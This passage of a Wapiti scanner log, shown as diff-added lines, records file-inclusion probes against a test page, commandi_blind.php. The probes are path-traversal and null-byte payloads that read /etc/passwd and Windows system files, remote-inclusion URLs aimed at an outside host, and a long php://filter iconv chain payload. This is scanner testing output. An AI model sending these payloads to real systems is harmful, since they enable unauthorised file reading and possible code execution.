+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.420 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&form=submit
+2024-03-20 16:35:57.438 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&form=submit
+2024-03-20 16:35:57.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=commandi_blind.php&form=submit
+2024-03-20 16:35:57.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=commandi_blind.php%00&form=submit
+2024-03-20 16:35:57.506 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=commandi_blind.php%3A%3A%24DATA&form=submit
+2024-03-20 16:35:57.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:35:57.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:35:57.562 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=%2Fetc%2Fpasswd
+2024-03-20 16:35:57.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=%2Fetc%2Fpasswd%00
+2024-03-20 16:35:57.605 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=%2Fetc%2Fservices
+2024-03-20 16:35:57.628 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=%2Fetc%2Fservices%00
+2024-03-20 16:35:57.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:35:57.680 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:35:57.701 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:35:57.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:57.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:57.771 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:35:57.793 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:35:57.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:35:57.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:57.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:57.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:57.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:57.975 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.062 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.087 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:58.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:58.201 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:58.248 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:58.282 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:35:58.319 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:58.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:58.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:58.446 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:58.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.550 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.572 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.592 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:58.611 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:58.641 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:58.667 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:58.686 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:58.716 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:35:58.741 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:58.771 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:35:58.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.846 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:35:58.890 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:35:58.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:59.006 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:59.036 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:59.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:59.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:35:59.140 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:35:59.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:35:59.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:35:59.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:35:59.274 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:35:59.306 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:35:59.349 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:35:59.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=commandi_blind.php
+2024-03-20 16:35:59.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=commandi_blind.php%00
+2024-03-20 16:35:59.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (0)
+	data: target=fuzz&form=commandi_blind.php%3A%3A%24DATA
+2024-03-20 16:35:59.510 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/commandi_blind.php (1)
+	data: form_bug=&bug=10
+2024-03-20 16:35:59.516 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&bug=10
+2024-03-20 16:35:59.529 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&bug=10
+2024-03-20 16:35:59.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2Fetc%2Fpasswd&bug=10
+2024-03-20 16:35:59.554 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2Fetc%2Fpasswd%00&bug=10
+2024-03-20 16:35:59.569 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=%2Fetc%2Fservices%00&bug=10
+2024-03-20 16:35:59.592 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=10
+2024-03-20 16:35:59.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&bug=10
+2024-03-20 16:35:59.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&bug=10
+2024-03-20 16:35:59.628 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=10
+2024-03-20 16:35:59.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=10
